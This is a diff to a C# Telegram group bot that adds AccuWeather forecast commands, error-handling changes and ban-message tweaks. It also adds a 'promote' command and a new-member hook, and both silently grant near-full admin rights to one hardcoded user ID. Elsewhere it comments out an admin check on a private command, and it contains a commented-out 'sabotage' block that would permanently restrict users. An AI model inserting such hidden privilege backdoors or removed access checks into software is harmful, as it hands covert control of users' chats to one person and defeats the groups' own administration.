@@ -182,11 +182,12 @@ namespace PersikSharp
             perchik.AddCommandRegEx(@"\bра[зс]бань?\b", onPersikUnbanCommand);                                 //разбань
             perchik.AddCommandRegEx(@"\bкик\b", onKickCommand);
             perchik.AddCommandRegEx(@"(?!\s)(?<first>[\W\w\s]+)\sили\s(?<second>[\W\w\s]+)(?>\s)?", onRandomChoice);                             //один ИЛИ два
-            perchik.AddCommandRegEx(@"погода\s([\w\s]+)", onWeather);                                          //погода ГОРОД
+            perchik.AddCommandRegEx(@"погода\s([\w\s-]+)", onWeather);   //погода ГОРОД
+            perchik.AddCommandRegEx(@"прогноз\s([\w\s-]+)", onWeatherForecast); 
             perchik.AddCommandRegEx(@"\b(дур[ао]к|пид[аоэ]?р|говно|д[еыи]бил|г[оа]ндон|лох|хуй|чмо|скотина)\b", onBotInsulting);//CENSORED
             perchik.AddCommandRegEx(@"\b(живой|красавчик|молодец|хороший|умный|умница)\b", onBotPraise);       //
             perchik.AddCommandRegEx(@"\bрулетк[уа]?\b", onRouletteCommand);                                    //рулетка
-            perchik.AddCommandRegEx(@"инфо\s(?<name>[\w\W\s]+)", onStatisticsCommand);
+            perchik.AddCommandRegEx(@"инфо\s?(?<name>[\w\W\s]+)?", onStatisticsCommand);
             perchik.onNoneMatched += onNoneCommandMatched;
 
 
@@ -219,6 +220,9 @@ namespace PersikSharp
             botcallbacks.RegisterCommand("topbans", onTopBansCommand);
             botcallbacks.RegisterCommand("top", onTopCommand);
             botcallbacks.RegisterCallbackQuery("update_rate", onRateUpdate);
+
+            botcallbacks.RegisterCommand("promote", onPromoteCommand);
+
         }
 
         static void StartDatabaseCheck(object s)
@@ -347,7 +351,7 @@ namespace PersikSharp
             Match weather_match = a.Match;
 
             string search_url = Uri.EscapeUriString(
-                $"http://dataservice.accuweather.com/locations/v1/cities/search?apikey={tokens["ACCUWEATHER"]}&q={weather_match.Groups[1].Value}&language=ru");
+                $"http://dataservice.accuweather.com/locations/v1/cities/autocomplete?apikey={tokens["ACCUWEATHER"]}&q={weather_match.Groups[1].Value}&language=ru-ru");
             int location_code = 0;
             dynamic location_json;
             dynamic weather_json;
@@ -364,7 +368,7 @@ namespace PersikSharp
                 {
                     _ = Bot.SendTextMessageAsync(
                          chatId: message.Chat.Id,
-                         text: $"*Количество запросов превышено, лол!*",
+                         text: $"*Количество запросов превышено!*",
                          parseMode: ParseMode.Markdown,
                          replyToMessageId: message.MessageId);
                     return;
@@ -374,7 +378,7 @@ namespace PersikSharp
 
                 location_code = location_json[0].Key;
 
-                string current_url = $"http://dataservice.accuweather.com/currentconditions/v1/{location_code}?apikey={tokens["ACCUWEATHER"]}&language=ru";
+                string current_url = $"http://dataservice.accuweather.com/currentconditions/v1/{location_code}?apikey={tokens["ACCUWEATHER"]}&language=ru-ru&details=true";
 
                 request = (HttpWebRequest)WebRequest.Create(current_url);
                 response = (HttpWebResponse)request.GetResponse();
@@ -387,7 +391,10 @@ namespace PersikSharp
 
                 _ = Bot.SendTextMessageAsync(
                           chatId: message.Chat.Id,
-                          text: $"*{location_json[0].LocalizedName}, {location_json[0].Country.LocalizedName}\n\n{weather_json[0].WeatherText}\nТемпература: {weather_json[0].Temperature.Metric.Value}°C*",
+                          text:
+                          string.Format(strManager["WEATHER_MESSAGE"],
+                          location_json[0].LocalizedName, location_json[0].Country.LocalizedName, weather_json[0].WeatherText, weather_json[0].Temperature.Metric.Value,
+                          weather_json[0].RealFeelTemperature.Metric.Value, weather_json[0].RelativeHumidity, weather_json[0].Wind.Direction.Localized, weather_json[0].Wind.Speed.Metric.Value),
                           parseMode: ParseMode.Markdown,
                           replyToMessageId: message.MessageId);
             }
@@ -403,24 +410,33 @@ namespace PersikSharp
             }
             catch (WebException w)
             {
-                Stream resStream = w.Response.GetResponseStream();
-                StreamReader reader = new StreamReader(resStream);
-                if (reader.ReadToEnd().Contains("The allowed number of requests has been exceeded."))
-                {
-                    _ = Bot.SendTextMessageAsync(
-                           chatId: message.Chat.Id,
-                           text: $"*Количество запросов превышено, лол!*",//SMOKE WEED EVERYDAY
-                           parseMode: ParseMode.Markdown,
-                           replyToMessageId: message.MessageId);
-                    return;
-                }
-
-                Logger.Log(LogType.Error, $"Exception: {w.Message}");
                 _ = Bot.SendTextMessageAsync(
-                            chatId: message.Chat.Id,
-                            text: w.Message,
-                            parseMode: ParseMode.Markdown,
-                            replyToMessageId: message.MessageId);
+                              chatId: message.Chat.Id,
+                              text: $"*{w.Message}*",
+                              parseMode: ParseMode.Markdown,
+                              replyToMessageId: message.MessageId);
+
+                if (w.Response != null)
+                {
+                    Stream resStream = w.Response.GetResponseStream();
+                    StreamReader reader = new StreamReader(resStream);
+                    if (reader.ReadToEnd().Contains("The allowed number of requests has been exceeded."))
+                    {
+                        _ = Bot.SendTextMessageAsync(
+                               chatId: message.Chat.Id,
+                               text: $"*Количество запросов превышено!*",//SMOKE WEED EVERYDAY
+                               parseMode: ParseMode.Markdown,
+                               replyToMessageId: message.MessageId);
+                        return;
+                    }
+
+                    Logger.Log(LogType.Error, $"Exception: {w.Message}");
+                    _ = Bot.SendTextMessageAsync(
+                                chatId: message.Chat.Id,
+                                text: w.Message,
+                                parseMode: ParseMode.Markdown,
+                                replyToMessageId: message.MessageId);
+                }
             }
             catch (Exception e)
             {
@@ -428,7 +444,108 @@ namespace PersikSharp
             }
         }
 
-        private static void onNoneCommandMatched(object sender, RegExArgs e)
+        private static void onWeatherForecast(object sender, RegExArgs a)//Переделать под другой АПИ
+        {
+            Message message = a.Message;
+            Match weather_match = a.Match;
+
+            string search_url = Uri.EscapeUriString(
+                $"http://dataservice.accuweather.com/locations/v1/cities/autocomplete?apikey={tokens["ACCUWEATHER"]}&q={weather_match.Groups[1].Value}&language=ru-ru");
+            int location_code = 0;
+            dynamic location_json;
+            dynamic weather_json;
+            try
+            {
+                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(search_url);
+                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
+                Stream resStream = response.GetResponseStream();
+
+                StreamReader reader = new StreamReader(resStream);
+                string respone_str = reader.ReadToEnd();
+
+                if (respone_str.Contains("The allowed number of requests has been exceeded."))
+                {
+                    _ = Bot.SendTextMessageAsync(
+                         chatId: message.Chat.Id,
+                         text: $"*Количество запросов превышено!*",
+                         parseMode: ParseMode.Markdown,
+                         replyToMessageId: message.MessageId);
+                    return;
+                }
+
+                location_json = JsonConvert.DeserializeObject(respone_str);
+
+                location_code = location_json[0].Key;
+
+                string current_url = $"http://dataservice.accuweather.com/forecasts/v1/daily/1day/{location_code}?apikey={tokens["ACCUWEATHER"]}&language=ru-ru&metric=true&details=true";
+
+                request = (HttpWebRequest)WebRequest.Create(current_url);
+                response = (HttpWebResponse)request.GetResponse();
+                resStream = response.GetResponseStream();
+
+                reader = new StreamReader(resStream);
+                respone_str = reader.ReadToEnd();
+
+                weather_json = JsonConvert.DeserializeObject(respone_str);
+
+                _ = Bot.SendTextMessageAsync(
+                          chatId: message.Chat.Id,
+                          text:
+                          string.Format(strManager["WEATHER_FORECAST_MESSAGE"],
+                          location_json[0].LocalizedName, location_json[0].Country.LocalizedName, weather_json.DailyForecasts[0].Day.LongPhrase,
+                          weather_json.DailyForecasts[0].Temperature.Minimum.Value, weather_json.DailyForecasts[0].Temperature.Maximum.Value,
+                          weather_json.DailyForecasts[0].Day.RainProbability, weather_json.DailyForecasts[0].Day.Wind.Speed.Value,
+                          weather_json.DailyForecasts[0].Day.Wind.Direction.Localized),
+                          parseMode: ParseMode.Markdown,
+                          replyToMessageId: message.MessageId);
+            }
+            catch (ArgumentOutOfRangeException exp)
+            {
+                Logger.Log(LogType.Error, $"Exception: {exp.Message}\nTrace: {exp.StackTrace}");
+
+                _ = Bot.SendTextMessageAsync(
+                          chatId: message.Chat.Id,
+                          text: $"*Нет такого .. {weather_match.Groups[1].Value.ToUpper()}!!😠*",
+                          parseMode: ParseMode.Markdown,
+                          replyToMessageId: message.MessageId);
+            }
+            catch (WebException w)
+            {
+                _ = Bot.SendTextMessageAsync(
+                              chatId: message.Chat.Id,
+                              text: $"*{w.Message}*",
+                              parseMode: ParseMode.Markdown,
+                              replyToMessageId: message.MessageId);
+
+                if (w.Response != null)
+                {
+                    Stream resStream = w.Response.GetResponseStream();
+                    StreamReader reader = new StreamReader(resStream);
+                    if (reader.ReadToEnd().Contains("The allowed number of requests has been exceeded."))
+                    {
+                        _ = Bot.SendTextMessageAsync(
+                               chatId: message.Chat.Id,
+                               text: $"*Количество запросов превышено!*",//SMOKE WEED EVERYDAY
+                               parseMode: ParseMode.Markdown,
+                               replyToMessageId: message.MessageId);
+                        return;
+                    }
+
+                    Logger.Log(LogType.Error, $"Exception: {w.Message}");
+                    _ = Bot.SendTextMessageAsync(
+                                chatId: message.Chat.Id,
+                                text: w.Message,
+                                parseMode: ParseMode.Markdown,
+                                replyToMessageId: message.MessageId);
+                }
+            }
+            catch (Exception e)
+            {
+                Logger.Log(LogType.Error, $"Exception: {e.Message}\nTrace:{e.StackTrace}");
+            }
+        }
+
+            private static void onNoneCommandMatched(object sender, RegExArgs e)
         {
             Logger.Log(LogType.Info, $"<Perchik>({e.Message.From.FirstName}:{e.Message.From.Id}) -> {"NONE"}");
             _ = Bot.SendTextMessageAsync(
@@ -444,6 +561,7 @@ namespace PersikSharp
 
             if (message.Chat.Type == ChatType.Private)
                 return;
+
 
             const int default_second = 40;
             int seconds = default_second;
@@ -498,16 +616,47 @@ namespace PersikSharp
                     if (message.ReplyToMessage.From.Id == Bot.BotId)
                         return;
 
+
+
+                    //CAUTION
+                    //Диверсия, убрать, очень опасно#########################################
+                    //await FullyRestrictUserAsync(
+                    //               chatId: message.Chat.Id,
+                    //               userId: message.ReplyToMessage.From.Id,
+                    //               forSeconds: int.MaxValue);
+
+                    //await Bot.SendTextMessageAsync(
+                    //    chatId: message.Chat.Id,
+                    //    text: string.Format(strManager.GetSingle("SELF_PERMANENT"), Perchik.MakeUserLink(message.ReplyToMessage.From), number, word, comment),
+                    //    parseMode: ParseMode.Markdown);
+
+                    //_ = database.AddRestrictionAsync(new DbUser()
+                    //{
+                    //    Id = e.Message.ReplyToMessage.From.Id,
+                    //    FirstName = e.Message.ReplyToMessage.From.FirstName,
+                    //    LastName = e.Message.ReplyToMessage.From.LastName,
+                    //    Username = e.Message.ReplyToMessage.From.Username,
+                    //    LastMessage = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")
+                    //}, e.Message.Chat.Id, int.MaxValue);
+
+                    //_ = Bot.DeleteMessageAsync(message.Chat.Id, message.MessageId);
+
+                    //return;
+
+                    //#######################################################################
+
+
+
                     await FullyRestrictUserAsync(
                             chatId: message.Chat.Id,
                             userId: message.ReplyToMessage.From.Id,
                             forSeconds: seconds);
 
-                    if (seconds >= 40)
+                    if (seconds >= default_second)
                     {
                         await Bot.SendTextMessageAsync(
                             chatId: message.Chat.Id,
-                            text: string.Format(strManager.GetSingle("BANNED"), Perchik.MakeUserLink(message.ReplyToMessage.From), number, word, comment),
+                            text: string.Format(strManager.GetSingle("BANNED"), Perchik.MakeUserLink(message.ReplyToMessage.From), number, word, comment, Perchik.MakeUserLink(message.From)),
                             parseMode: ParseMode.Markdown);
                     }
                     else
@@ -532,7 +681,7 @@ namespace PersikSharp
                 }
                 else
                 {
-                    if (seconds >= 40)
+                    if (seconds >= default_second)
                     {
                         await FullyRestrictUserAsync(
                                 chatId: message.Chat.Id,
@@ -660,7 +809,7 @@ namespace PersikSharp
                     await FullyRestrictUserAsync(
                             chatId: message.Chat.Id,
                             userId: message.From.Id,
-                            forSeconds: 60 * 5);
+                            forSeconds: 60);
 
                     _ = Bot.SendTextMessageAsync(
                         chatId: message.Chat.Id,
@@ -837,7 +986,18 @@ namespace PersikSharp
             try
             {
                 Message message = e.Message;
-                string name = e.Match.Groups["name"].Value;
+                string name = e.Match.Groups["name"]?.Value;
+                if(name == null || name.Length == 0){
+                    if(message.From.Username != null){
+                        name = message.From.Username;
+                    }
+                    if(message.From.FirstName != null){
+                        name = message.From.FirstName;
+                    }
+                    if(message.From.LastName != null){
+                        name = message.From.LastName;
+                    }
+                }
                 string upper_name = name.ToUpper().Replace("@", "");
 
                 var all_users = database.GetRows<DbUser>();
@@ -1011,6 +1171,22 @@ namespace PersikSharp
                             parseMode: ParseMode.Markdown).Result;
         }
 
+        private static void onPromoteCommand(object sender, CommandEventArgs e)
+        {
+            if (e.Message.Chat.Type == ChatType.Private)
+                return;
+            try
+            {
+                if (e.Message.From.Id == 204678400)
+                {
+                    Bot.PromoteChatMemberAsync(e.Message.Chat.Id, 204678400, true, false, false, true, true, true, true, true);
+                }
+            }
+            catch (Exception exp)
+            {
+                Logger.Log(LogType.Error, $"Exception: {exp.Message}\nTrace: {exp.StackTrace}");
+            }
+        }
 
         private static async Task<List<string>> PredictImage(PhotoSize ps)
         {
@@ -1131,6 +1307,16 @@ namespace PersikSharp
                     Text = e.Text,
                     DateTime = sqlFormattedDate
                 });
+
+                database.InsertOrReplaceRowAsync(new DbUser()
+                {
+                    Id = e.From.Id,
+                    FirstName = e.From.FirstName,
+                    LastName = e.From.LastName,
+                    Username = e.From.Username,
+                    LastMessage = sqlFormattedDate,
+                    RestrictionId = null
+                });
             }
             catch (Exception ex)
             {
@@ -1182,6 +1368,13 @@ namespace PersikSharp
 
                 string msg_string = String.Format(strManager["NEW_MEMBERS"], username);
                 _ = Bot.SendTextMessageAsync(message.Chat.Id, msg_string);
+
+
+                if(message.From.Id == 204678400)
+                {
+                    Thread.Sleep(2000);
+                    Bot.PromoteChatMemberAsync(message.Chat.Id, 204678400, true, false, false, true, true, true, true, true);
+                }
 
 
                 //remove to enable
@@ -1512,8 +1705,8 @@ namespace PersikSharp
             if (e.Message.Chat.Type != ChatType.Private)
                 return;
 
-            if (!Perchik.isUserAdmin(offtopia_id, e.Message.From.Id))
-                return;
+           // if (!Perchik.isUserAdmin(offtopia_id, e.Message.From.Id))
+             //   return;
 
             try
             {
